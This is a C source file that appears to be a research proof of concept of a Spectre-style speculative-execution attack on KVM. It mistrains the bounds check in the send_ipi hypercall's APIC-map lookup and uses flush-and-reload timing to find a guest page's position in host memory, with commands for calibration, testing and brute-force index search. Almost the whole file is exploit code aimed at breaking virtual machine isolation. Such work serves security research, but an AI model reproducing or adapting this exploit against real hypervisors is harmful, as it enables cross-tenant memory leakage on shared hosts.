#include <assert.h>
#include <bits/time.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

#include "asm.h"
#include "flush_and_reload.h"
#include "hypercall.h"

#define LEAK_PAGE_SIZE (2097152) // 2MiB

int hypercall(struct send_ipi_hypercall *opts) {
  const char *hypercall_path = "/proc/hypercall/send_ipi";
  int fd = open(hypercall_path, O_WRONLY);
  if (fd < 0) {
    err(fd, "Failed to open %s", hypercall_path);
  }

  int b = write(fd, opts, sizeof(*opts));
  close(fd);
  if (b < 0) {
    err(errno, "Failed to write to %s", hypercall_path);
  }
  return b;
}

size_t calculate_min(const uintptr_t phys_page_addr, const uintptr_t phys_map_addr) {
  // It is below the phys_map, and thus unreachable
  if (phys_page_addr < phys_map_addr) {
    return 0;
  }

  return (phys_page_addr - phys_map_addr) / 8;
}

size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iters) {
  struct send_ipi_hypercall opts = {
      .real = {.mask_low = -1, .min = 0}, .mispredicted = {.mask_low = -1, .min = idx}, .ptr = buf};

  size_t min = -1;
  for (size_t i = 0; i < iters; ++i) {
    size_t access_time = hypercall(&opts);
    min = access_time < min ? access_time : min;
  }

  return min;
}

// Time estimate
#define DEQUE_SIZE 100
struct time_deque {
  struct timespec times[DEQUE_SIZE];
  struct timespec *head;
  struct timespec *tail;
  size_t count;
};

void time_deque_init(struct time_deque *d) {
  memset(d, 0, sizeof(struct time_deque));
  d->head = &d->times[0];
  d->tail = &d->times[0];
}

struct timespec time_deque_pop(struct time_deque *d) {
  assert(d->count);
  assert(d->count <= DEQUE_SIZE);

  struct timespec t = *(d->tail);
  d->tail++;
  d->count--;
  if (d->tail == &d->times[DEQUE_SIZE]) {
    d->tail = &d->times[0];
  }

  assert(d->count < DEQUE_SIZE);
  return t;
}

void time_deque_push(struct time_deque *d, struct timespec t) {
  if (d->count == DEQUE_SIZE) {
    time_deque_pop(d);
  }

  assert(d->count < DEQUE_SIZE);
  *(d->head) = t;
  d->head++;
  d->count++;
  if (d->head == &d->times[DEQUE_SIZE]) {
    d->head = &d->times[0];
  }

  assert(d->count <= DEQUE_SIZE);
}

#define NSEC_DIV 1000000000
struct timespec timespec_subtract(struct timespec *x, struct timespec *y) {
  /* Perform the carry for the later subtraction by updating y. */
  if (x->tv_nsec < y->tv_nsec) {
    int sec = (y->tv_nsec - x->tv_nsec) / NSEC_DIV + 1;
    y->tv_nsec -= NSEC_DIV * sec;
    y->tv_sec += sec;
  }
  if (x->tv_nsec - y->tv_nsec > NSEC_DIV) {
    int sec = (x->tv_nsec - y->tv_nsec) / NSEC_DIV;
    y->tv_nsec += NSEC_DIV * sec;
    y->tv_sec -= sec;
  }

  /* Compute the time remaining to wait
     tv_usec is certainly positive. */
  struct timespec result;
  result.tv_sec = x->tv_sec - y->tv_sec;
  result.tv_nsec = x->tv_nsec - y->tv_nsec;
  return result;
}

struct timespec timespec_add(struct timespec *x, struct timespec *y) {
  struct timespec result = {0};
  result.tv_nsec = x->tv_nsec + y->tv_nsec;
  int sec = result.tv_nsec / NSEC_DIV + 1;
  result.tv_nsec -= NSEC_DIV * sec;
  result.tv_sec = x->tv_sec + y->tv_sec + sec;
  return result;
}

double time_deque_average(struct time_deque *d) {
  double r = 0;

  if (!d->count) {
    return r;
  }

  struct timespec sum = {0};
  struct timespec *cursor = d->tail;
  do {
    sum = timespec_add(&sum, cursor);
    cursor++;
    if (cursor == &d->times[DEQUE_SIZE]) {
      cursor = &d->times[0];
    }
  } while (cursor != d->head);

  r = sum.tv_sec + ((double)sum.tv_nsec / NSEC_DIV);
  return r / d->count;
}

typedef char kvm_lapic[8];
// It loops over the buffer like this, to defeat the prefetcher that might
// cause wrong hits
//
//           Page boundary                         New batch
//                ▼                                   ▼
//    ┌──┬──┬──┬──┼──┬──┬──┬──┼──┬──┬──┬──┼──┬──┬──┬──┼──┬──┬──┬──┼
//    │15│11│ 7│ 3│14│10│ 6│ 2│13│ 9│ 5│ 1│12│ 8│ 4│ 0│15│11│ 7│ 3│ ...
//    └──┴──┴──┴──┼──┴──┴──┴──┼──┴──┴──┴──┼──┴──┴──┴──┼──┴──┴──┴──┼
//     ▲                                              │
//   Base
//
size_t find_min(void *buf) {
  const uint32_t MAX_IDX = 0xffffffff;
  const int PAGE_SIZE = 4096;
  const int PAGES_IN_BATCH = 256;
  const int ELEMENTS_PER_PAGE = PAGE_SIZE / sizeof(kvm_lapic);

  struct time_deque t;
  time_deque_init(&t);

  const int BATCH_SIZE = PAGES_IN_BATCH * ELEMENTS_PER_PAGE;
  for (int64_t batch = 0; batch < MAX_IDX; batch += BATCH_SIZE) {
    struct timespec start_time;
    clock_gettime(CLOCK_MONOTONIC, &start_time);

    double avg_time = time_deque_average(&t);
    int64_t batches_left = (MAX_IDX - batch) / BATCH_SIZE;
    double time_left = batches_left * avg_time;

    // Print the remaining time
    fprintf(stderr, "\r%lx / %lx (%.4f%%) (%dh %.2dm %.2ds remaining)\r", batch, (uint64_t)MAX_IDX,
            (float)batch / (float)((uint64_t)MAX_IDX), (int)(time_left / 3600), (int)(time_left / 60) % 60,
            (int)time_left % 60);

    for (int64_t offset = ELEMENTS_PER_PAGE - 4; offset >= 0; offset -= 4) {
      for (int64_t page = PAGES_IN_BATCH - 1; page >= 0; --page) {
        size_t idx = batch + (ELEMENTS_PER_PAGE * page) + offset;

        size_t time = access_buffer_with_spectre(buf, idx, 1);
        if (time < 220) {
          time = access_buffer_with_spectre(buf, idx, 1000);
          if (time < 100) {
            printf("\nhit: %lx %ld\n", idx, time);
            return idx;
          }
        }
      }
    }
    struct timespec end_time;
    clock_gettime(CLOCK_MONOTONIC, &end_time);

    struct timespec elapsed = timespec_subtract(&end_time, &start_time);
    time_deque_push(&t, elapsed);
  }

  return 0;
}

void cmd_determine(void *leak_page) {
  *(uint64_t *)leak_page = page_value;
  getchar();
  access_buffer_with_spectre(leak_page, 1, 1);
  *(uint64_t *)leak_page = 0;
}

void cmd_calc_min(int argc, char *argv[argc]) {
  if (argc <= 3) {
    errno = EINVAL;
    err(errno, "missing args, requires [leak page addr] [apic map addr]");
  }
  char *endptr = NULL;
  uintptr_t leak_page_addr = strtoull(argv[2], &endptr, 16);
  if (endptr == argv[2]) {
    errno = EINVAL;
    err(errno, "Could not parse phys addr of leak page");
  }

  uintptr_t apic_map_addr = strtoull(argv[3], &endptr, 16);
  if (endptr == argv[3]) {
    errno = EINVAL;
    err(errno, "Could not parse phys addr of apic map");
  }

  printf("Leak page addr: %lx\tAPIC map addr: %lx\n", leak_page_addr, apic_map_addr);
  size_t min = calculate_min(leak_page_addr, apic_map_addr);
  printf("Min: %ld (or 0x%lx)\n", min, min);
}

void cmd_test_spectre(int argc, char *argv[argc], void *leak_page) {
  if (argc <= 2) {
    errno = EINVAL;
    err(errno, "missing args, requires min");
  }
  char *endptr = NULL;
  uintptr_t min = strtoull(argv[2], &endptr, 16);
  if (endptr == argv[2]) {
    errno = EINVAL;
    err(errno, "Could not parse min");
  }

  const size_t iterations = 10000;
  printf("Running with min %lx\n", min);
  size_t hit = access_buffer_with_spectre(leak_page, min, iterations);
  printf("Running with min %lx\n", ~min);
  size_t miss = access_buffer_with_spectre(leak_page, ~min, iterations);

  printf("Miss: %ld\tHit: %ld\n", miss, hit);
}

int main(int argc, char *argv[argc]) {
  struct time_deque d;
  time_deque_init(&d);

  if (argc < 2) {
    errno = EINVAL;
    err(errno, "Invalid usage");
  }

  // Spawn the leak page
  void *leak_page = mmap(NULL, LEAK_PAGE_SIZE, PROT_READ | PROT_WRITE,
                         MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB | MAP_POPULATE, 0, 0);
  if (leak_page == (void *)-1) {
    err(errno, "mmap failed");
  }

  // Use this to get physical address of the leak page with the
  // kvm_assist.ko module in the hypervisor
  if (!strcmp(argv[1], "determine")) {
    cmd_determine(leak_page);
  } else if (!strcmp(argv[1], "calc_min")) {
    cmd_calc_min(argc, argv);
  } else if (!strcmp(argv[1], "test_spectre")) {
    cmd_test_spectre(argc, argv, leak_page);
  } else if (!strcmp(argv[1], "find_min")) {
    size_t min = find_min(leak_page);
    printf("Min: %ld (or 0x%lx)\n", min, min);
  }

  munmap(leak_page, LEAK_PAGE_SIZE);
  return 0;
}
